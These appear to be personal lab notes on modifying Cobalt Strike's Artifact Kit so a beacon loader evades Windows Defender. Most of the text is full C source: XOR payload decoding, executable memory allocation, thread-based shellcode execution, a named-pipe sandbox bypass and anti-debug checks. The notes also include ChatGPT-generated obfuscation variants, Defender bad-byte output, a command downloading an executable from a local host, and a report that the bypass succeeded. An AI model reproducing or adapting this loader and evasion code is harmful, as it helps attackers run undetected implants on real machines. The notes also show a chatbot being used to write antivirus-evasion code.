starting again from a new `patch.c` and implementing all grows changes

line 36

```c
// Line 36
void spawn(void * buffer, int length, char * key) {
    char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
    int z;
    /* decode the process name with the key (valid name, \0, junk to fill 64) */
    for (z = 0; z < sizeof(process); z++) {
        char* a = (char *)process + z;
        char* b = (char *)process + z;
        GetTickCount();
        *a = *b ^ key[z % 8];
    }
    
    /* decode the payload with the key */
    for (z = 0; z < length; z++) {
        char* a = (char *)buffer + z;
        char* b = (char *)buffer + z;
        GetTickCount();
        *a = *b ^ key[z % 8];
    }

    /* propagate our key function pointers to our payload */
    set_key_pointers(buffer);
    inject(buffer, length, process);
}
```
line 124 - actually line 119
```c
// ~ Line 124
for (int i = 0; i < length; i++) {
    char* a = (char *)ptr + i;
    char* b = (char *)buffer + i;
    GetTickCount();
    *a = *b ^ key[i % 8];
}
```

![[Pasted image 20250130020325.png]]

```bash
00000000  31 d2 41 89 d0 42 80 3c  01 00 74 16 41 89 c1 46  |1.A..B.<..t.A..F|                                                                                    00000010  0f b7 04 01 ff c2 41 c1  c9 08 45 01 c8 44 31 c0  |......A...E..D1.|  
```
back here...
![[Pasted image 20250130020443.png]]

```bash
{
  uint uVar1;
  
  uVar1 = 0;
  while (*(char *)(param_1 + (ulonglong)uVar1) != '\0') {
    uVar1 = uVar1 + 1;
  }
  return;
```

`patch.c` with grows changes only

```c
/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2012-2024 Fortra, LLC and its group of companies. All trademarks and registered trademarks are the property of their respective owners.
 *
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

char data[sizeof(phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void set_key_pointers(void * buffer) {
   phear * payload = (phear *)data;

   /* this payload does not adhere to our protocol to pass GetModuleHandleA / GetProcAddress to
      the payload directly. */
   if (payload->gmh_offset <= 0 || payload->gpa_offset <= 0)
      return;

   void * gpa_addr = (void *)GetProcAddress;
   void * gmh_addr = (void *)GetModuleHandleA;

   memcpy(buffer + payload->gmh_offset, &gmh_addr, sizeof(void *));
   memcpy(buffer + payload->gpa_offset, &gpa_addr, sizeof(void *));
}

#ifdef _MIGRATE_
#include "start_thread.c"
#include "injector.c"
// Line 36
void spawn(void * buffer, int length, char * key) {
    char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
    int z;
    /* decode the process name with the key (valid name, \0, junk to fill 64) */
    for (z = 0; z < sizeof(process); z++) {
        char* a = (char *)process + z;
        char* b = (char *)process + z;
        GetTickCount();
        *a = *b ^ key[z % 8];
    }
    
    /* decode the payload with the key */
    for (z = 0; z < length; z++) {
        char* a = (char *)buffer + z;
        char* b = (char *)buffer + z;
        GetTickCount();
        *a = *b ^ key[z % 8];
    }

    /* propagate our key function pointers to our payload */
    set_key_pointers(buffer);
    inject(buffer, length, process);
}
#else

#if STACK_SPOOF == 1
#include "spoof.c"
#endif

void run(void * buffer) {
   void (*function)();
   function = (void (*)())buffer;
#if STACK_SPOOF == 1
   beacon_threadid = GetCurrentThreadId();
#endif
   function();
}

void spawn(void * buffer, int length, char * key) {
   void * ptr = NULL;

   /* This memory allocation will be released by beacon for these conditions:.
    *    1. The stage.cleanup is set to true
    *    2. The reflective loader passes the address of the loader into DllMain.
    *
    * This is true for the built-in Cobalt Strike reflective loader and the example
    * user defined reflective loader (UDRL) in the Arsenal Kit.
    */
#if USE_HeapAlloc
   /* Create Heap */
   HANDLE heap;
   heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);

   /* allocate the memory for our decoded payload */
   ptr = HeapAlloc(heap, 0, 10);

   /* Get wacky and add a bit of of HeapReAlloc */
   if (length > 0) {
      ptr = HeapReAlloc(heap, 0, ptr, length);
   }

#elif USE_VirtualAlloc
#if USE_SYSCALLS == 1
   SIZE_T size = length;
   NtAllocateVirtualMemory(GetCurrentProcess(), &ptr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#else
   ptr = VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#endif

#elif USE_MapViewOfFile
#if USE_SYSCALLS == 1
   SIZE_T size = length;
   HANDLE hFile = create_file_mapping(0, length);
   ptr = map_view_of_file(hFile);
   NtClose(hFile);
#else
   HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, length, NULL);
   ptr = MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
   CloseHandle(hFile);
#endif
#endif


// ~ Line 124
for (int i = 0; i < length; i++) {
    char* a = (char *)ptr + i;
    char* b = (char *)buffer + i;
    GetTickCount();
    *a = *b ^ key[i % 8];
}

#if STACK_SPOOF == 1
   /* setup stack spoofing */
   set_stack_spoof_code();
#endif

   /* propagate our key function pointers to our payload */
   set_key_pointers(ptr);

#if defined(USE_VirtualAlloc) || defined(USE_MapViewOfFile)
   /* fix memory protection */
   DWORD old;
#if USE_SYSCALLS == 1
   NtProtectVirtualMemory(GetCurrentProcess(), &ptr, &size, PAGE_EXECUTE_READ, &old);
#else
   VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);
#endif
#endif

   /* spawn a thread with our data */
#if USE_SYSCALLS == 1
   HANDLE thandle;
   NtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &run, ptr, 0, 0, 0, 0, NULL);
#else
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
#endif
}
#endif
```
chatgpt full changes

```c
/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2012-2024 Fortra, LLC and its group of companies. All trademarks and registered trademarks are the property of their respective owners.
 *
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

char data[sizeof(phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void obscure_mem(void *ptr, int length, char *key) {
    for (int idx = 0; idx < length; idx++) {
        char *mem_loc = (char *)ptr + idx;
        *mem_loc ^= key[idx % 8];
        GetTickCount();  // Obfuscating with an unused function call
    }
}

void set_key_pointers(void *buffer) {
    phear *payload = (phear *)data;  // Assume data is defined elsewhere

    if (payload->gmh_offset <= 0 || payload->gpa_offset <= 0) return;

    void *gpa_addr = (void *)GetProcAddress;
    void *gmh_addr = (void *)GetModuleHandleA;

    memcpy(buffer + payload->gmh_offset, &gmh_addr, sizeof(void *));
    memcpy(buffer + payload->gpa_offset, &gpa_addr, sizeof(void *));
}

#ifdef _MIGRATE_
#include "start_thread.c"
#include "injector.c"

// Spawn function with obfuscation
void spawn(void *buffer, int length, char *key) {
    char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"; 
    obscure_mem(process, sizeof(process), key);  // Decode process name

    obscure_mem(buffer, length, key);  // Decode payload

    set_key_pointers(buffer);  // Set key function pointers

    inject(buffer, length, process);  // Inject the payload
}
#else

#if STACK_SPOOF == 1
#include "spoof.c"
#endif

void run(void *buffer) {
    void (*function)();
    function = (void (*)())buffer;
#if STACK_SPOOF == 1
    beacon_threadid = GetCurrentThreadId();
#endif
    function();
}

void spawn(void *buffer, int length, char *key) {
    void *ptr = NULL;

#if USE_HeapAlloc
    HANDLE heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    ptr = HeapAlloc(heap, 0, 10);

    if (length > 0) {
        ptr = HeapReAlloc(heap, 0, ptr, length);
    }

#elif USE_VirtualAlloc
    #if USE_SYSCALLS == 1
    SIZE_T size = length;
    NtAllocateVirtualMemory(GetCurrentProcess(), &ptr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    #else
    ptr = VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    #endif

#elif USE_MapViewOfFile
    #if USE_SYSCALLS == 1
    HANDLE hFile = create_file_mapping(0, length);
    ptr = map_view_of_file(hFile);
    NtClose(hFile);
    #else
    HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, length, NULL);
    ptr = MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
    CloseHandle(hFile);
    #endif
#endif

    obscure_mem(ptr, length, key);  // Decode payload in allocated memory

#if STACK_SPOOF == 1
    set_stack_spoof_code();
#endif

    set_key_pointers(ptr);  // Set key function pointers

#if defined(USE_VirtualAlloc) || defined(USE_MapViewOfFile)
    DWORD old;
#if USE_SYSCALLS == 1
    NtProtectVirtualMemory(GetCurrentProcess(), &ptr, &size, PAGE_EXECUTE_READ, &old);
#else
    VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);
#endif
#endif

#if USE_SYSCALLS == 1
    HANDLE thandle;
    NtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &run, ptr, 0, 0, 0, 0, NULL);
#else
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
#endif
}
#endif

```
chatgpt last attempt

```bash
#include <windows.h>
#include <stdio.h>

typedef void (*CREATE_THREAD_FUNC)(LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

void* resolve_api(const char *lib_name, const char *func_name) {
    HMODULE hModule = GetModuleHandleA(lib_name);
    if (!hModule) {
        return NULL;
    }
    return GetProcAddress(hModule, func_name);
}

char* xor_string(char* str, char key) {
    for (int i = 0; str[i] != '\0'; i++) {
        str[i] ^= key;
    }
    return str;
}

BOOL is_debugger_present() {
    BOOL debugger_present = FALSE;
    __asm {
        MOV EAX, FS:[0x30]        // PEB address
        MOV EAX, [EAX+0x2]        // PEB->BeingDebugged
        MOV debugger_present, AL
    }
    return debugger_present;
}

void unpack_payload(void *buffer, int length, char *key) {
    for (int i = 0; i < length; i++) {
        ((char *)buffer)[i] ^= key[i % 8];  // Decrypt payload byte-by-byte
    }
}

void spawn(void *buffer, int length, char *key) {
    if (is_debugger_present()) {
        exit(1);  // Exit if debugger is detected
    }

    char process[] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
    xor_string(process, 0xAA);  // XOR encode process string

    for (int z = 0; z < sizeof(process); z++) {
        char* a = (char *)process + z;
        char* b = (char *)process + z;
        *a = *b ^ key[z % 8];  // XOR decode process name
    }

    // Decrypt payload
    unpack_payload(buffer, length, key);

    // Dynamically resolve CreateThread function using XOR encoding
    CREATE_THREAD_FUNC CreateThreadPtr = (CREATE_THREAD_FUNC)resolve_api("kernel32.dll", xor_string("CreateThread", 0xAA));

    if (CreateThreadPtr) {
        CreateThreadPtr(NULL, 0, (LPTHREAD_START_ROUTINE)&run, buffer, 0, NULL);  // Spawn thread
    } else {
        // Handle error if function is not resolved
    }
}

```


```bash
wget http://192.168.179.129:80/haha2 -UseBasicP -OutFile "C:\Users\blaster\Desktop\haha2.exe" 
```

changed from `indirect` to `none`, regular beacon works without defender on

![[Pasted image 20250130150803.png]]
bad bytes - testing to make it work with defender on
```bash
[!] Isolated bad bytes at offset 0xB04 in the original file [approximately 2820 / 387584 bytes]                                        
00000000  15 27 0c 06 00 48 89 c3  31 c0 39 c6 7e 15 48 89  |.'...H..1.9.~.H.|                                                         
00000010  c2 83 e2 07 8a 54 15 00  32 14 07 88 14 03 48 ff  |.....T..2.....H.|     
```

original line 114 - changing with grow
![[Pasted image 20250130151249.png]]
chatgpt change line 114
```bash
/* decode the payload with the key */
for (int i = 0; i < length; i++) {
    // Introduce randomness and more XOR operations
    unsigned int randomOffset = (unsigned int)((i * 0x1F1F1F1F) ^ (GetTickCount() & 0xFFFFF)) % 8; // Introduce randomness based on the tick count and index
    char dynamicKey = key[randomOffset]; // Select a random key based on the offset

    // Obfuscate further with some meaningless operations
    char obfuscatedBuffer = *((char *)buffer + i) ^ dynamicKey;
    obfuscatedBuffer = obfuscatedBuffer + (i % 3);  // Add small variations to confuse analysis
    *((char *)ptr + i) = obfuscatedBuffer ^ ((i * 0x2A) % 255); // Apply a secondary XOR operation based on the index

    // More dummy operations to confuse static analysis
    volatile int dummy = (i ^ randomOffset) * 42;  // Meaningless operation
    dummy ^= (dummy >> 1);  // Further dummy operation
}
```
changed `patch.c` with grow to his notes - made sure to use `shift+tab` to get proper `c` spacing

from his [Cobalt Strike Mods - 29 Jan 2024.pdf](file:///C:/Users/Bugs/Desktop/CS_Notes/Cobalt%20Strike%20Mods%20-%2029%20Jan%202024.pdf)

able to get beacon working, still need to bypass defender

![[Pasted image 20250130153017.png]]
bad bytes
```bash

00000000  89 c3 39 f7 7e 1c ff 15  ce 0b 06 00 48 89 f0 83  |..9.~.......H...|                                                         
00000010  e0 07 41 8a 04 04 32 44  35 00 88 04 33 48 ff c6  |..A...2D5...3H..|                                                                                                                                                                                                [*] Trojan:Win64/CobaltStrike.TR!MTB                                                                                                   [+] Windows Defender - 1.5896236s                                                                                                      [+] Total time elasped: 1.6057232s       
```
virtual protect function still flagging
![[Pasted image 20250130153211.png]]

#### Grow Help with artifact kit resolution
![[Pasted image 20250130153447.png]]

changing the line with `chatgpt` to have it do the same exact `forloop` just written differently

```c
   // ~ Line 124
   for (int something = 0; something < length; something++) {
      char* a = (char *)ptr + something;
      char* b = (char *)fluffer + something;
      GetTickCount();
      *a = *b ^ key[something % 8];
   }
```

changed this from 8 - 16
![[Pasted image 20250130160435.png]]
added this `gettickcount`
![[Pasted image 20250130160504.png]]
file clean
![[Pasted image 20250130160902.png]]
beacon didnt work - though bypass defender, changing the 16 - 8 back to, and 15 back to 7

just the addition gitcount - clean
![[Pasted image 20250130161451.png]]
was able to drop `haha7.exe` straight to the desktop with defender open and execute it
![[Pasted image 20250130165455.png]]
was able to execute it and properly catch beacon
![[Pasted image 20250130165654.png]]
full `patch.c` used that got artifact kit to work
```c
/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2012-2024 Fortra, LLC and its group of companies. All trademarks and registered trademarks are the property of their respective owners.
 *
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

char data[sizeof(phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void set_key_pointers(void * fluffer) {
   phear * payload = (phear *)data;

   /* this payload does not adhere to our protocol to pass GetModuleHandleA / GetProcAddress to
      the payload directly. */
   if (payload->gmh_offset <= 0 || payload->gpa_offset <= 0)
      return;

   void * gpa_addr = (void *)GetProcAddress;
   void * gmh_addr = (void *)GetModuleHandleA;

   memcpy(fluffer + payload->gmh_offset, &gmh_addr, sizeof(void *));
   memcpy(fluffer + payload->gpa_offset, &gpa_addr, sizeof(void *));
}

#ifdef _MIGRATE_
#include "start_thread.c"
#include "injector.c"
 // Line 36
void spawn(void * fluffer, int length, char * key) {
   char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
   int z;
   /* decode the process name with the key (valid name, \0, junk to fill 64) */
   for (int z = 0; z < sizeof(process); z++) {
      char* a = (char *)process + z;
      char* b = (char *)process + z;
      GetTickCount();
      *a = *b ^ key[z % 8];
   }
   /* decode the payload with the key */
   for (z = 0; z < length; z++) {
      char* a = (char *)fluffer + z;
      char* b = (char *)fluffer + z;
      GetTickCount();
      *a = *b ^ key[z % 8];
   }
   /* propagate our key function pointers to our payload */
   set_key_pointers(fluffer);
   inject(fluffer, length, process);
}

#else

#if STACK_SPOOF == 1
#include "spoof.c"
#endif

void run(void * fluffer) {
   void (*function)();
   function = (void (*)())fluffer;
#if STACK_SPOOF == 1
   beacon_threadid = GetCurrentThreadId();
#endif
   function();
}

void spawn(void * fluffer, int length, char * key) {
   void * ptr = NULL;

   /* This memory allocation will be released by beacon for these conditions:.
    *    1. The stage.cleanup is set to true
    *    2. The reflective loader passes the address of the loader into DllMain.
    *
    * This is true for the built-in Cobalt Strike reflective loader and the example
    * user defined reflective loader (UDRL) in the Arsenal Kit.
    */
#if USE_HeapAlloc
   /* Create Heap */
   HANDLE heap;
   heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);

   /* allocate the memory for our decoded payload */
   ptr = HeapAlloc(heap, 0, 10);

   /* Get wacky and add a bit of of HeapReAlloc */
   if (length > 0) {
      ptr = HeapReAlloc(heap, 0, ptr, length);
   }

#elif USE_VirtualAlloc
#if USE_SYSCALLS == 1
   SIZE_T size = length;
   NtAllocateVirtualMemory(GetCurrentProcess(), &ptr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#else
   ptr = VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#endif

#elif USE_MapViewOfFile
#if USE_SYSCALLS == 1
   SIZE_T size = length;
   HANDLE hFile = create_file_mapping(0, length);
   ptr = map_view_of_file(hFile);
   NtClose(hFile);
#else
   HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, length, NULL);
   ptr = MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
   CloseHandle(hFile);
#endif
#endif


   // ~ Line 124  
   int index = 0;  
   while (index < length) {  
      char *a = (char *)ptr + index;  
      char *b = (char *)fluffer + index;  
      GetTickCount();  
      *a = *b ^ key[index & 7]; // Using bitwise AND instead of modulus for the same effect  
      GetTickCount();
      index++;  
   }  


#if STACK_SPOOF == 1
   /* setup stack spoofing */
   set_stack_spoof_code();
#endif

   /* propagate our key function pointers to our payload */
   set_key_pointers(ptr);

#if defined(USE_VirtualAlloc) || defined(USE_MapViewOfFile)
   /* fix memory protection */
   DWORD old;
#if USE_SYSCALLS == 1
   NtProtectVirtualMemory(GetCurrentProcess(), &ptr, &size, PAGE_EXECUTE_READ, &old);
#else
   VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);
#endif
#endif

   /* spawn a thread with our data */
#if USE_SYSCALLS == 1
   HANDLE thandle;
   NtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &run, ptr, 0, 0, 0, 0, NULL);
#else
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
#endif
}
#endif


```

 full `bypass-pipe.c` that bypasses defender
```c
/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2012-2024 Fortra, LLC and its group of companies. All trademarks and registered trademarks are the property of their respective owners.
 *
 *
 * A/V sandbox bypass with named pipes.
 *
 * Strategy - feed obfuscated payload data through a named pipe before
 *            executing it. This will cause many A/V sandbox tools to
 *            give up on the binary.
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

/* a place to track our random-ish pipe name */
char pipename[64];

void server(char * data, int length) {
   DWORD  wrote = 0;
#if USE_SYSCALLS == 1
   HANDLE pipe = create_named_pipe(pipename);
#else
   HANDLE pipe = CreateNamedPipeA(pipename, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE, 1, 0, 0, 0, NULL);
#endif

   if (pipe == NULL || pipe == INVALID_HANDLE_VALUE)
      return;

#if USE_SYSCALLS == 1
   BOOL result = connect_named_pipe(pipe);
#else
   BOOL result = ConnectNamedPipe(pipe, NULL);
#endif
   if (!result)
      return;

   while (length > 0) {
#if USE_SYSCALLS == 1
      result = write_file(pipe, data, length, &wrote);
#else
      result = WriteFile(pipe, data, length, &wrote, NULL);
#endif
      if (!result)
         break;

      data   += wrote;
      length -= wrote;
   }

#if USE_SYSCALLS == 1
   NtClose(pipe);
#else
   CloseHandle(pipe);
#endif
}

BOOL client(char * buffer, int length) {
   DWORD  read = 0;
#if USE_SYSCALLS == 1
   HANDLE pipe = create_named_pipe_file(pipename);
#else
   HANDLE pipe = CreateFileA(pipename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
#endif
   if (pipe == INVALID_HANDLE_VALUE)
      return FALSE;

   /* read the encoded payload from the pipe */
   while (length > 0) {
#if USE_SYSCALLS == 1
      BOOL result = read_file(pipe, buffer, length, &read);
#else
      BOOL result = ReadFile(pipe, buffer, length, &read, NULL);
#endif
      if (!result)
         break;

      buffer += read;
      length -= read;
   }

#if USE_SYSCALLS == 1
   NtClose(pipe);
#else
   CloseHandle(pipe);
#endif
   return TRUE;
}

DWORD server_thread(LPVOID whatever) {
   phear * payload = (phear *)data;

   /* setup a pipe for our payload */
   server(payload->payload, payload->length);

   return 0;
}

DWORD client_thread(LPVOID whatever) {
   phear * payload = (phear *)data;

   /* allocate data for our "cleaned" payload */
   char * buffer = (char *)malloc(payload->length);

   /* try to connect to the pipe */
   do {
      Sleep(1024);
   }
   while (!client(buffer, payload->length));

   /* spawn our payload */
   spawn(buffer, payload->length, payload->key);

   /* clean up after ourselves */
   free(buffer);

   return 0;
}

void start(HINSTANCE mhandle) {
   /* switched from snprintf... as some A/V product was flagging based on the function *sigh* 
      92, 92, 46, 92, 112, 105, 112, 101, 92 is \\.\pipe\
   
   */
   sprintf(pipename, "%c%c%c%c%c%c%c%c%cnotrt-svc\\noptev", 92, 92, 46, 92, 112, 105, 112, 101, 92);

   /* start our server and our client */
#if USE_SYSCALLS == 1
   HANDLE thandle;
   NtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &server_thread, NULL, 0, 0, 0, 0, NULL);
#else
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&server_thread, (LPVOID) NULL, 0, NULL);
#endif

   client_thread(NULL);
}

```